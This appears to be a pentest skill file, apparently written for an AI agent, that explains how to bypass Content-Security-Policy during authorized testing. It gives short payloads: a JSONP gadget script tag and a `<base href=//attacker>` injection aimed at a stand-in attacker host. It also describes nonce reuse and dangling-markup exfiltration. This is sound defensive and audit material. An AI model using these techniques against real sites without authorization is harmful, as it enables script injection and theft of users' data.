---
name: web-csp-bypass
description: >
  Get script to run despite a Content-Security-Policy — the step after finding an injection that CSP
  is blocking. Load when you have HTML/JS injection but the payload won't execute, on "CSP is
  blocking my XSS", or when auditing a CSP for weakness. Signals: a Content-Security-Policy header, a
  blocked-script console error, a reflected injection with no popup.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: medium
owasp: [A05]
cwe: [CWE-1021]
tools: [csp-evaluator, burp]
schema_version: 1
---

# Bypassing Content-Security-Policy

## When it applies
You have an injection point but CSP is stopping execution. CSP is a mitigation, not a fix — a weak
policy still lets script run, and turning a "blocked" XSS into a firing one is what makes the bug
real (and higher severity).

## Why it works
Most deployed CSPs have a gap: an over-broad allowlist, a leftover `unsafe-inline`, a reusable
nonce, a `script-src` host that also serves a JSONP/AngularJS gadget, or a missing `base-uri`/
`object-src`. Each gap is a path to execution the policy author didn't intend.

## Method
1. **Read the policy**: paste it into Google's CSP Evaluator; note `script-src`, `object-src`,
   `base-uri`, `default-src`, and whether it's report-only (report-only blocks nothing).
2. **`unsafe-inline` / no nonce** → inline script just runs; you're done.
3. **Allowlisted host with a gadget**: a `script-src` host that hosts JSONP (`?callback=`) or an old
   AngularJS/library → load it to execute (`<script src=//allowed/jsonp?callback=alert>`).
4. **`'self'` + an upload/echo**: host your JS on the same origin (file upload, a reflected `.js`
   endpoint) and point `<script src>` at it.
5. **Missing `base-uri`**: inject `<base href=//attacker>` to hijack relative script src.
6. **`strict-dynamic` / nonce reuse**: if a nonce is static across responses, reuse it; if a trusted
   script creates elements, ride it.
7. **Dangling markup / exfil**: when execution is truly blocked, steal data with markup that leaks to
   an allowed `img-src`/`connect-src` destination.

## Gotchas
- Report-Only (`Content-Security-Policy-Report-Only`) does not enforce — don't report it as a bypass.
- `object-src 'none'` + `base-uri 'none'` + nonce'd strict-dynamic is genuinely hard; say so rather
  than forcing a weak bypass.
- A bypass is only a finding if you also have the injection to use it.

## Verify success
Your script executes (or data exfiltrates) with the CSP active — a real `alert(document.domain)` /
callback, not just a reflected string.

## References
Google CSP Evaluator; PortSwigger CSP bypass; the JSONP/AngularJS gadget catalogues.
